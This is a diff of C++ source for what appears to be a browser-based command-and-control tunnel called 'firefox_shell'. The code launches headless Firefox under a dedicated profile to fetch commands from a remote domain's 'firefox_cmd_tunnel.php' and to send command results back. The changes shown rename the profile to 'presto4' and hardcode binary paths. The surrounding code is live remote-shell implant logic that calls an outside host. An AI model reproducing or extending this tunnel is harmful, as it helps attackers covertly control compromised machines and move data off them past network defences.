@@ -156,7 +156,7 @@ std::string get_default_firefox_profiledir(const std::string& name)
         	{  
 			std::string test=ent->d_name;
  
-                	if(test.find("presto")!=string::npos)                                 
+                	if(test.find("presto4")!=string::npos)                                 
 				return test;
 
    
@@ -185,7 +185,7 @@ void write_cmd_cookie()
 {
 	std::string str1="http://", str2="/firefox_shell/firefox_cmd_tunnel.php";
 	std::string path=str1+domain+str2;
-	std::string firefox_params="timeout 2s firefox -P \"presto\" -headless -url "+path;
+	std::string firefox_params="/usr/bin/timeout 2s /usr/bin/firefox -P \"presto4\" -headless -url "+path;
 	cout << firefox_params+"\n" << endl;
 	std::system(firefox_params.c_str());	
 }
@@ -211,7 +211,7 @@ void construct_html(std::string result_cmd,  std::string filename)
 
 void send_result_cmd(std::string html_file)
 {
-	std::string firefox_params="timeout 2s firefox -P \"presto\" -headless "+html_file;	
+	std::string firefox_params="/usr/bin/timeout 2s /usr/bin/firefox -P \"presto4\" -headless "+html_file;	
 	cout << firefox_params+"\n" << endl;
 	std::system(firefox_params.c_str());
 //todo add error test...	
